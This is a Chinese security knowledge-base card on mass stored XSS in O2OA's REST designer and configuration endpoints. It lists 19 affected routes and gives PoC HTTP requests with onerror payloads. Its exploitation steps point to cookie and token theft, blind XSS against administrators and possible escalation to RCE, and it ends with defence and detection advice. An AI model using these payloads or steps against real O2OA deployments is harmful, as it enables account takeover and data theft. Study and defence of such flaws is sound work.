---
id: web-generic-xss-o2oa-rest-designer-mass-stored-xss
title: O2OA REST 设计器/配置接口批量存储型 XSS：无输出编码与无全局 XSS Filter
type: scenario
domain: web
path: web/generic/xss
technique: rest-designer-mass-stored-xss
tags:
- xss
- stored-xss
- java
- rest
- o2oa
- vulnerability-clustering
- code-audit
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T01:57:09+08:00'
  notes: 已对照原文核对：REST controller 统一 asyncResponse.resume 无输出编码、无全局 XssFilter、19 条 POST/PUT 路由清单与原始数据包、calendarConfig/person 等 PoC 均一致；未验证点：原文唯一结果截图 img 04 中 payload 以可见文本形式出现在首页“最新信息”，未直接展示 alert 执行，实际存储型 XSS 触发依赖前端渲染点，卡片按原文“已提交 vuldb”口径记为 high
url: /docs/web/generic/xss/web-generic-xss-o2oa-rest-designer-mass-stored-xss/
draft: false
kb_aliases:
- O2OA 存储型 XSS
- REST 接口批量 XSS
- 设计器接口存储型 XSS
- 无全局 XSSFilter
- asyncResponse.resume XSS
- 漏洞聚集批量挖掘
---

## 一句话结论

当 Java REST 应用用 `asyncResponse.resume(...)`/统一响应工厂直接返回 JSON，既不按上下文做输出编码、也没有像 RuoYi 那样的全局 `XssFilter`，而前端又把返回字段拼接进 HTML 时，任何保存“名称/别名/描述/显示名”等字符串的 POST/PUT 接口都会成为存储型 XSS 的同类 sink；按“漏洞聚集”思路枚举同一框架下的兄弟接口，可以一次性发现成批漏洞（原文在 O2OA 的设计器、配置、组织、流程、查询等模块列出近 20 条路由）。

## 原理

- **输出编码缺位**：这类接口的 controller 形如
  ```java
  @POST
  @Produces(MediaType.APPLICATION_JSON_UTF_8)
  public void saveSystemConfig(@Suspended AsyncResponse asyncResponse, @Context HttpServletRequest request, JsonElement jsonElement) {
      ActionResult<ActionSaveConfig.Wo> result = new ActionResult<>();
      EffectivePerson effectivePerson = this.effectivePerson(request);
      result = new ActionSaveConfig().execute(effectivePerson, jsonElement);
      asyncResponse.resume(ResponseFactory.getEntityTagActionResultResponse(request, result));
  }
  ```
  响应由通用工厂序列化为 JSON/EntityTag，未对字段做 HTML 实体编码；框架也不像模板引擎（Thymeleaf/JSP）那样默认转义。
- **前端拼接**：O2OA 桌面端把设计器/配置对象的 `name`、`alias`、`description`、`toMyMeetingViewName` 等字段直接写入 DOM（innerHTML/模板拼接），保存时的恶意字符串在之后打开页面/列表/下拉框时被当作 HTML 解析。
- **无全局过滤器**：若应用在 Servlet 层注册了全局 `XssFilter`（如 RuoYi 的 `FilterRegistrationBean` + `XssFilter`），所有请求体会先被清洗；该应用没有这层防护，导致同一个缺陷模式在多个模块重复出现。
- **漏洞聚集效应**：同一团队、同一套 REST 脚手架、同一批开发习惯，使“字符串字段原样落库 + 原样回显”的模式被复制到大量模块；审计一个已确认的 XSS 后，按路由前缀和 controller 模板横向搜索，就能找到同源缺陷。历史漏洞（如会议设置 XSS）只是入口线索，真正可利用面是整片同构代码。
- **payload 形态**：`"><img src=1 onerror=alert(1)>` 先闭合前端属性/标签再引入事件处理器；对 JSON 中嵌套的 `data`/`mobileData` 字符串，需要按 JSON 转义层级写 payload（`\\\"` 等），使落库后的最终值仍含可执行 HTML。

## 触发条件

- 目标为 O2OA 一类 Java REST 应用，接口用 `@POST`/`@PUT` 接收 JSON，字符串字段直接持久化。
- 应用未配置全局输入过滤/输出编码，前端未使用安全的文本绑定（使用 innerHTML/字符串模板）。
- 攻击者拥有可访问设计器/配置/组织/流程/查询模块的账号（低权限账号即可，部分接口仅需登录）。
- 受害者（管理员或其他用户）会打开渲染这些字段的页面，形成存储型 XSS。
- 同类接口存在于多个模块，字段名不同但 sink 相同。

## 利用步骤

1. 先用历史漏洞或前端流量定位一个已知会回显的配置接口，例如会议设置保存。
2. 在请求体中挑字符串字段注入探测 payload：
   ```json
   {"weekBegin":"0","disableViewList":[],"toMonthViewName":"\"><img src=1 onerror=alert('hacker')>"}
   ```
3. 保存后打开会议/首页/列表等渲染页面，确认弹窗；若被转义，检查是入口过滤还是前端编码，换字段或换编码层级再试。
4. 按“漏洞聚集”横向枚举：在代理工具中只保留 `POST`/`PUT`（过滤 `GET`/`DELETE`），对设计器、配置、组织、流程、查询等模块的保存接口批量替换 `name`/`alias`/`description`/显示名字段。
5. 对每个候选接口记录：路由、需要的权限、payload 字段、触发页面、是否弹窗。
6. 将 payload 换成实际利用代码（窃取 Cookie/Token、以受害者身份调用接口、钓鱼表单），评估影响。

原文确认的同源路由（节选，均以 JSON 保存字符串字段）：

```text
/x_organization_assemble_personal/jaxrs/definition/calendarConfig
/x_organization_assemble_control/jaxrs/person/{personId}
/x_organization_assemble_control/jaxrs/unit/{flag}
/x_program_center/jaxrs/script
/x_program_center/jaxrs/agent
/x_program_center/jaxrs/invoke
/x_portal_assemble_designer/jaxrs/dict/{id}
/x_portal_assemble_designer/jaxrs/widget
/x_portal_assemble_designer/jaxrs/page
/x_cms_assemble_control/jaxrs/design/appdict
/x_cms_assemble_control/jaxrs/form
/x_cms_assemble_control/jaxrs/script
/x_processplatform_assemble_designer/jaxrs/form
/x_processplatform_assemble_designer/jaxrs/process
/x_processplatform_assemble_designer/jaxrs/script
/x_query_assemble_designer/jaxrs/stat
/x_query_assemble_designer/jaxrs/table
/x_query_assemble_designer/jaxrs/statement
/x_query_assemble_designer/jaxrs/importmodel
```

## PoC

会议设置保存（已登录，带 `x-token`/`Authorization`）：

```http
PUT /x_organization_assemble_personal/jaxrs/definition/calendarConfig?v=develop-10.0-410-3d5e0d2 HTTP/1.1
Host: target
Content-Type: application/json; charset=UTF-8
Cookie: x-token=<session>
Authorization: <session>

{"weekBegin":"0","disableViewList":[],"toMonthViewName":"\"><img src=1 onerror=alert('hacker')>","toWeekViewName":"","toDayViewName":"","toListViewName":""}
```

组织人员保存：

```http
PUT /x_organization_assemble_control/jaxrs/person/<personId> HTTP/1.1
Content-Type: application/json

{"id":"<personId>","name":"hack","signature":"<img src=1 onerror=alert(1)>","description":"\"><img src=1 onerror=alert(1)>", ...}
```

保存成功后访问首页/会议页/人员详情，payload 在受害者浏览器执行。原文用本地 `localhost` 环境验证，截图显示首页渲染出注入内容。

## 变体与关联

- **盲打管理员**：低权限用户写入的设计器字段可能在管理员后台列表中渲染，形成 blind stored XSS；可用带外回连（Beacon/Webhook）确认。
- **嵌套 JSON 字段**：`data`、`mobileData` 自身是“JSON 字符串”，payload 需要多一层反斜杠转义，才能让最终存储值包含原始 HTML。
- **其他同源 sink**：富文本/公告/表单描述、组织架构名称、流程节点名称、报表标题等；审计时按“保存接口 + 前端展示”成对排查。
- **升级风险**：设计器中的脚本字段（`language: javascript`，`text` 中包含 `Java.type("java.lang.Class")...exec`）若被服务端脚本引擎执行，可能进一步升级为 RCE；该点原文仅作为字段内容提交，未验证执行，需另行确认。
- **与 PDF XSS 的关系**：同属该应用“上传/预览未加固”的另一类 XSS，见 `web-generic-xss-pdf-javascript-inline-preview`。
- **方法论关联**：本卡即“漏洞聚集/同源缺陷”思路的落地案例：从一个历史漏洞出发，按框架模板横向扩展。

## 检测与防御

- 输出编码按上下文进行：HTML 文本、属性、JS、URL 分别编码；前端使用安全的文本绑定（`textContent`）而非 `innerHTML` 拼接。
- 服务端对所有持久化的字符串字段做统一校验/清洗，并对渲染层做编码；不要依赖单点黑名单。
- 配置全局 XSS 过滤器（如 Servlet Filter）作为兜底，但过滤器不能替代正确的输出编码。
- 部署严格 CSP，禁止内联脚本与 `onerror` 等事件属性；对富文本使用白名单 sanitizer。
- 代码审计：搜索 `@POST`/`@PUT` + 直接持久化 JSON 字符串字段的 controller，追踪该字段到前端模板/DOM 的渲染路径；同一脚手架生成的兄弟接口要批量核查。
- 运行时检测：请求体中出现 `"><`、`<img`、`onerror=` 等模式；对高频批量保存接口做速率与内容告警。
